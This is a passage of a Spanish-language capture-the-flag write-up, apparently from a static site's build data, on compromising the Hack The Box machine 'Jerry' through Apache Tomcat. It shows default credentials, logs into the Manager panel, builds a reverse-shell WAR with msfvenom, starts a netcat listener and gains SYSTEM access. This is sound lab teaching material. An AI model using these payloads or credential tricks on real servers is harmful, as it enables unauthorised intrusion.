una visión general del estado de la red y del sistema objetivo, sirviendo como base para definir la estrategia y priorizar las acciones en las siguientes fases de la evaluación.\n\n### Analisis de Vulnerabilidades\n\n#### Reconocimiento Inicial\n\nSeguidamente, una vez identificados los servicios activos en el sistema objetivo, se detecta la presencia del puerto 8080/TCP abierto. Dicho puerto corresponde a un servicio web gestionado por Apache Tomcat, un contenedor de servlets ampliamente utilizado en entornos corporativos para desplegar aplicaciones Java.\n\n#### Puerto 8080 (Servicio Web)\n\nAl ejecutar el comando **whatweb** desde la terminal, se obtiene información detallada acerca de las tecnologı́as y frameworks que utiliza el servicio web en el puerto correspondiente. El resultado de este análisis revela que el servicio está siendo ejecutando **Apache Tomcat** en su versión **7.0.88**\n\nApache Tomcat es un servidor de aplicaciones web de código abierto desarrollado por la Apache Software Foundation (ASF).\nSu principal función es ejecutar aplicaciones web creadas en Java, ya que implementa de manera nativa las especificaciones de:\n\n- Java Servlet\n- JavaServer Pages (JSP)\n- WebSocket\n- Java Expression Language (EL)\n\nEn otras palabras, Tomcat actúa como un contenedor de servlets, permitiendo que las aplicaciones web escritas en Java puedan ejecutarse en un servidor.\n\nAl acceder al servicio web vemos la pagina por defecto de Apache Tomcat:\n\n[![Apache Tomcat](/jerry/tomcat01.png)](/jerry/tomcat01.png)\n\nAl realizar una búsqueda de directorios utilizando la herramienta **Gobuster**, se logró identificar la existencia del directorio **/manager/** dentro del servicio web expuesto en el puerto 8080. Este hallazgo resulta especialmente relevante, ya que dicho directorio corresponde al **Tomcat Web Application Manager**, una interfaz de administración incluida en Apache Tomcat.\n\n[![busqueda gobuster](/jerry/gobuster.png)](/jerry/gobuster.png)\n\nAl navegar a la aplicación Manager, se muestra un inicio de sesión:\n\n[![manager tomcat](/jerry/tomcatmanager.png)](/jerry/tomcatmaneger.png)\n\nAl no disponer de credenciales válidas para acceder al panel de Manager de Apache Tomcat, se procedio a realizar una búsqueda en Internet enfocada en credenciales por defecto comúnmente configuradas en este tipo de entornos dando como resultado las siguientes credenciales:>\n\n- tomcat:tomcat\n- admin:admin\n- manager:manager\n\nAl realizar múltiples intentos de acceso al panel **Manager** utilizando credenciales no válidas, el servidor responde con una página de error **403 Access Denied**, indicando que el usuario no tiene permisos para acceder al recurso solicitado.\n\nCuriosamente, en este escenario particular, la página de error no solo bloquea el acceso, sino que también **filtra información sensible**, mostrando indirectamente las credenciales válidas necesarias para autenticarse correctamente. Este tipo de comportamiento constituye una **fuga de información (information Leakage)**, ya que proporciona a un atacante datos que normalmente deberían permanecer confidenciales.\n\n[![information leakage](/jerry/tomcaterror.png)](/jerry/tomcaterror.png)\n\nAl ingresar las **credenciales válidas** obtenidas previamente, se logra acceder al **panel de control** del aplicativo Manager de Apache Tomcat. Esta interfaz proporciona un **entorno administrativo completo**, permitiendo al usuario autorizado gestionar todas las aplicaciones web desplegadas en el servidor.\n\n[![panel de tomcat](/jerry/tomcatpanel.png)](/jerry/tomcatpanel.png)\n\nSeguidamente, una vez autenticados en el panel Manager de Apache Tomcat, procedimos a realizar una búsqueda de vulnerabilidades asociadas al servidor y a su versión específica. Esta fase de investigación permite identificar posibles vectores de ataque que podrían aprovecharse para comprometer el sistema de manera más profunda.\n\nDurante el análisis, se evaluaron aspectos como configuraciones inseguras, servicios adicionales expuestos, y la posibilidad de ejecutar código de manera remota. La investigación arrojó como resultado un método de intrusión efectivo: `la subida de un archivo WAR malicioso`.\n\nLos archivos WAR (Web Application Archive) son paquetes que contienen aplicaciones Java completas listas para desplegar en un servidor Tomcat. Si se logra subir un WAR malicioso al panel Manager, este se ejecuta bajo los privilegios del proceso de Tomcat, permitiendo al atacante ejecutar comandos en el sistema operativo, obtener un shell remoto y, dependiendo de la configuración del servidor, incluso escalar privilegios.\n\n[![subir archivo war](/jerry/war01.png)](/jerry/war01.png)\n\nA continuación creamos nuestro war malicioso mediante msfvenom:\n\n```bash\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.x.x LPORT=443 -f war -o shell.war\n```\nCorroboramos que el archivo war fue subido exitosamente:\n\n[![comprobacion del shell](/jerry/shell.png)](/jerry/shell.png)\n\ny nos ponemos en escucha utilizando **netcat** en el puerto especificado en el arvhivo war, al ser windows tambien utilizamos en comando **rlwrap** para tener una shell semi-interactiva:\n\n```bash\nrlwrap nc -lnvp 443\n```\n\nAl darle clip a shell en el panel de control se ejecuta el archivo war y nos da una shell inversa:\n\n[![revert shell](/jerry/terminal01.png)](/jerry/terminal01.png)\n\nLuego mediante el comando **whoami** comprobamos que somos el usuario **nt authority\\system**:\n\n[![comprobación de usuario](/jerry/terminal02.png)](/jerry/terminal02.png)\n\nPor ultimo nos dirigimos al directorio `C:\\Users\\Administrator\\Desktop\\flags` y litamos el archivo `2 for the price of 1.txt` en el cual se encuentran las flags y user y root.","src/content/writeups/jerry.md","6b140ccb9cdfbbd8",{"html":96,"metadata":97},"\u003Ch3 id=\"descripción\">Descripción\u003C/h3>\n\u003Cp>Jerry es una máquina Windows catalogada con un nivel de dificultad fácil en la plataforma Hack The Box. Su principal enfoque es demostrar la explotación de Apache Tomcat, un servidor de aplicaciones ampliamente utilizado en entornos empresariales.\u003C/p>\n\u003Cp>El reto comienza con un reconocimiento inicial que permite identificar el servicio Tomcat en ejecución y acceder a su panel de administración. A partir de ahí, se explora la posibilidad de autenticarse o abusar de configuraciones por defecto para desplegar un archivo malicioso (WAR). Este procedimiento conduce a la obtención de un reverse shell dentro del sistema.\u003C/p>\n\u003Cp>Una vez establecido el acceso, se observa que el proceso comprometido se está ejecutando con privilegios elevados, específicamente como NT Authority\\SYSTEM, la cuenta con mayor nivel de permisos en sistemas Windows. Esto implica un control total del objetivo\u003C/p>\n\u003Ch3 id=\"objetivos\">Objetivos\u003C/h3>\n\u003Ch4 id=\"objetivo-general\">Objetivo general\u003C/h4>\n\u003Cp>Comprender y aplicar técnicas de explotación en un entorno Windows vulnerable, utilizando debilidades en la configuración de Apache Tomcat, con el fin de obtener acceso privilegiado y comprometer completamente el sistema.\u003C/p>\n\u003Ch4 id=\"objetivos-especificos\">Objetivos Especificos\u003C/h4>\n\u003Cul>\n\u003Cli>Realizar un proceso de reconocimiento para identificar servicios expuestos y tecnologías en uso.\u003C/li>\n\u003Cli>Detectar la presencia del servidor Apache Tomcat y analizar posibles credenciales o configuraciones por defecto.\u003C/li>\n\u003Cli>Explorar la carga de archivos maliciosos (WAR) como vector de ataque para obtener un reverse shell.\u003C/li>\n\u003Cli>Validar el nivel de privilegios obtenidos y comprobar la ejecución bajo la cuenta NT Authority\\SYSTEM.\u003C/li>\n\u003C/ul>\n\u003Ch3 id=\"analisis-de-vulnerabilidades\">Analisis de Vulnerabilidades\u003C/h3>\n\u003Ch4 id=\"reconocimiento-inicial\">Reconocimiento Inicial\u003C/h4>\n\u003Cp>Se comenzó realizando un análisis inicial sobre el sistema, cuyo objetivo principal fue comprobar la disponibilidad y accesibilidad del equipo o servicio objetivo desde el segmento de red en el que se estaba operando. Esta verificación resultó fundamental para asegurar que la comunicación entre el host atacante y el sistema de destino fuera posible antes de iniciar fases más avanzadas de la evaluación. Para llevar a cabo esta tarea de reconocimiento preliminar, se emplearon herramientas de terminal ampliamente utilizadas en auditorı́as de seguridad:\u003C/p>\n\u003Cp>\u003Cstrong>Ping\u003C/strong>, para enviar solicitudes ICMP al host y confirmar su capacidad de respuesta, además de obtener información básica como ser el tipo de sistema operativo ya sea Windows o Linux mediante el \u003Cstrong>TTL\u003C/strong>.\u003C/p>\n\u003Cp>\u003Cimg src=\"/jerry/ping.png\" alt=\"Ejecución del comando ping\">\u003C/p>\n\u003Cp>\u003Cstrong>Nmap\u003C/strong>, para efectuar un escaneo de puertos y servicios disponibles, identificando posibles puntos de entrada o servicios expuestos que pudieran ser analizados en etapas posteriores.\u003C/p>\n\u003Cp>\u003Cimg src=\"/jerry/nmap.png\" alt=\"Ejecución del comando ping\">\u003C/p>\n\u003Cp>Este proceso inicial permitió obtener una visión general del estado de la red y del sistema objetivo, sirviendo como base para definir la estrategia y priorizar las acciones en las siguientes fases de la evaluación.\u003C/p>\n\u003Ch3 id=\"analisis-de-vulnerabilidades-1\">Analisis de Vulnerabilidades\u003C/h3>\n\u003Ch4 id=\"reconocimiento-inicial-1\">Reconocimiento Inicial\u003C/h4>\n\u003Cp>Seguidamente, una vez identificados los servicios activos en el sistema objetivo, se detecta la presencia del puerto 8080/TCP abierto. Dicho puerto corresponde a un servicio web gestionado por Apache Tomcat, un contenedor de servlets ampliamente utilizado en entornos corporativos para desplegar aplicaciones Java.\u003C/p>\n\u003Ch4 id=\"puerto-8080-servicio-web\">Puerto 8080 (Servicio Web)\u003C/h4>\n\u003Cp>Al ejecutar el comando \u003Cstrong>whatweb\u003C/strong> desde la terminal, se obtiene información detallada acerca de las tecnologı́as y frameworks que utiliza el servicio web en el puerto correspondiente. El resultado de este análisis revela que el servicio está siendo ejecutando \u003Cstrong>Apache Tomcat\u003C/strong> en su versión \u003Cstrong>7.0.88\u003C/strong>\u003C/p>\n\u003Cp>Apache Tomcat es un servidor de aplicaciones web de código abierto desarrollado por la Apache Software Foundation (ASF).\nSu principal función es ejecutar aplicaciones web creadas en Java, ya que implementa de manera nativa las especificaciones de:\u003C/p>\n\u003Cul>\n\u003Cli>Java Servlet\u003C/li>\n\u003Cli>JavaServer Pages (JSP)\u003C/li>\n\u003Cli>WebSocket\u003C/li>\n\u003Cli>Java Expression Language (EL)\u003C/li>\n\u003C/ul>\n\u003Cp>En otras palabras, Tomcat actúa como un contenedor de servlets, permitiendo que las aplicaciones web escritas en Java puedan ejecutarse en un servidor.\u003C/p>\n\u003Cp>Al acceder al servicio web vemos la pagina por defecto de Apache Tomcat:\u003C/p>\n\u003Cp>\u003Ca href=\"/jerry/tomcat01.png\">\u003Cimg src=\"/jerry/tomcat01.png\" alt=\"Apache Tomcat\">\u003C/a>\u003C/p>\n\u003Cp>Al realizar una búsqueda de directorios utilizando la herramienta \u003Cstrong>Gobuster\u003C/strong>, se logró identificar la existencia del directorio \u003Cstrong>/manager/\u003C/strong> dentro del servicio web expuesto en el puerto 8080. Este hallazgo resulta especialmente relevante, ya que dicho directorio corresponde al \u003Cstrong>Tomcat Web Application Manager\u003C/strong>, una interfaz de administración incluida en Apache Tomcat.\u003C/p>\n\u003Cp>\u003Ca href=\"/jerry/gobuster.png\">\u003Cimg src=\"/jerry/gobuster.png\" alt=\"busqueda gobuster\">\u003C/a>\u003C/p>\n\u003Cp>Al navegar a la aplicación Manager, se muestra un inicio de sesión:\u003C/p>\n\u003Cp>\u003Ca href=\"/jerry/tomcatmaneger.png\">\u003Cimg src=\"/jerry/tomcatmanager.png\" alt=\"manager tomcat\">\u003C/a>\u003C/p>\n\u003Cp>Al no disponer de credenciales válidas para acceder al panel de Manager de Apache Tomcat, se procedio a realizar una búsqueda en Internet enfocada en credenciales por defecto comúnmente configuradas en este tipo de entornos dando como resultado las siguientes credenciales:>\u003C/p>\n\u003Cul>\n\u003Cli>tomcat:tomcat\u003C/li>\n\u003Cli>admin:admin\u003C/li>\n\u003Cli>manager:manager\u003C/li>\n\u003C/ul>\n\u003Cp>Al realizar múltiples intentos de acceso al panel \u003Cstrong>Manager\u003C/strong> utilizando credenciales no válidas, el servidor responde con una página de error \u003Cstrong>403 Access Denied\u003C/strong>, indicando que el usuario no tiene permisos para acceder al recurso solicitado.\u003C/p>\n\u003Cp>Curiosamente, en este escenario particular, la página de error no solo bloquea el acceso, sino que también \u003Cstrong>filtra información sensible\u003C/strong>, mostrando indirectamente las credenciales válidas necesarias para autenticarse correctamente. Este tipo de comportamiento constituye una \u003Cstrong>fuga de información (information Leakage)\u003C/strong>, ya que proporciona a un atacante datos que normalmente deberían permanecer confidenciales.\u003C/p>\n\u003Cp>\u003Ca href=\"/jerry/tomcaterror.png\">\u003Cimg src=\"/jerry/tomcaterror.png\" alt=\"information leakage\">\u003C/a>\u003C/p>\n\u003Cp>Al ingresar las \u003Cstrong>credenciales válidas\u003C/strong> obtenidas previamente, se logra acceder al \u003Cstrong>panel de control\u003C/strong> del aplicativo Manager de Apache Tomcat. Esta interfaz proporciona un \u003Cstrong>entorno administrativo completo\u003C/strong>, permitiendo al usuario autorizado gestionar todas las aplicaciones web desplegadas en el servidor.\u003C/p>\n\u003Cp>\u003Ca href=\"/jerry/tomcatpanel.png\">\u003Cimg src=\"/jerry/tomcatpanel.png\" alt=\"panel de tomcat\">\u003C/a>\u003C/p>\n\u003Cp>Seguidamente, una vez autenticados en el panel Manager de Apache Tomcat, procedimos a realizar una búsqueda de vulnerabilidades asociadas al servidor y a su versión específica. Esta fase de investigación permite identificar posibles vectores de ataque que podrían aprovecharse para comprometer el sistema de manera más profunda.\u003C/p>\n\u003Cp>Durante el análisis, se evaluaron aspectos como configuraciones inseguras, servicios adicionales expuestos, y la posibilidad de ejecutar código de manera remota. La investigación arrojó como resultado un método de intrusión efectivo: \u003Ccode>la subida de un archivo WAR malicioso\u003C/code>.\u003C/p>\n\u003Cp>Los archivos WAR (Web Application Archive) son paquetes que contienen aplicaciones Java completas listas para desplegar en un servidor Tomcat. Si se logra subir un WAR malicioso al panel Manager, este se ejecuta bajo los privilegios del proceso de Tomcat, permitiendo al atacante ejecutar comandos en el sistema operativo, obtener un shell remoto y, dependiendo de la configuración del servidor, incluso escalar privilegios.\u003C/p>\n\u003Cp>\u003Ca href=\"/jerry/war01.png\">\u003Cimg src=\"/jerry/war01.png\" alt=\"subir archivo war\">\u003C/a>\u003C/p>\n\u003Cp>A continuación creamos nuestro war malicioso mediante msfvenom:\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"bash\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">msfvenom\u003C/span>\u003Cspan style=\"color:#79B8FF\"> -p\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> java/jsp_shell_reverse_tcp\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> LHOST=10.10.x.x\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> LPORT=\u003C/span>\u003Cspan style=\"color:#79B8FF\">443\u003C/span>\u003Cspan style=\"color:#79B8FF\"> -f\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> war\u003C/span>\u003Cspan style=\"color:#79B8FF\"> -o\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> shell.war\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Corroboramos que el archivo war fue subido exitosamente:\u003C/p>\n\u003Cp>\u003Ca href=\"/jerry/shell.png\">\u003Cimg src=\"/jerry/shell.png\" alt=\"comprobacion del shell\">\u003C/a>\u003C/p>\n\u003Cp>y nos ponemos en escucha utilizando \u003Cstrong>netcat\u003C/strong> en el puerto especificado en el arvhivo war, al ser windows tambien utilizamos en comando \u003Cstrong>rlwrap\u003C/strong> para tener una shell semi-interactiva:\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"bash\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">rlwrap\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> nc\u003C/span>\u003Cspan style=\"color:#79B8FF\"> -lnvp\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 443\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Al darle clip a shell en el panel de control se ejecuta el archivo war y nos da una shell inversa:\u003C/p>\n\u003Cp>\u003Ca href=\"/jerry/terminal01.png\">\u003Cimg src=\"/jerry/terminal01.png\" alt=\"revert shell\">\u003C/a>\u003C/p>\n\u003Cp>Luego mediante el comando \u003Cstrong>whoami\u003C/strong> comprobamos que somos el usuario \u003Cstrong>nt authority\\system\u003C/strong>:\u003C/p>\n\u003Cp>\u003Ca href=\"/jerry/terminal02.png\">\u003Cimg src=\"/jerry/terminal02.png\" alt=\"comprobación de usuario\">\u003C/a>\u003C/p>\n\u003Cp>Por ultimo nos dirigimos al directorio \u003Ccode>C:\\Users\\Administrator\\Desktop\\flags\u003C/code> y litamos el archivo \u003Ccode>2 for the price of 1.txt\u003C/code> en el cual se encuentran las flags y user y root.\u003C/p>",{"headings":98,"localImagePaths":112,"remoteImagePaths":113,"frontmatter":114,"imagePaths":116},[99,100,101,102,103,104,105,107,109],{"depth":35,"slug":36,"text":37},{"depth":35,"slug":39,"text":40},{"depth":42,"slug":43,"text":44},{"depth":42,"slug":46,"text":47},{"depth":35,"slug":49,"text":50},{"depth":42,"slug":52,"text":53},{"depth":35,"slug":106,"text":50},"analisis-de-vulnerabilidades-1",{"depth":42,"slug":108,"text":53},"reconocimiento-inicial-1",{"depth":42,"slug":110,"text":111},"puerto-8080-servicio-web","Puerto 8080 (Servicio Web)",[],[],{"title":84,"os":85,"dificultad":18,"img":86,"skills":115,"plataforma":17,"description":91},[20,88,89,90],[],"jerry.md"]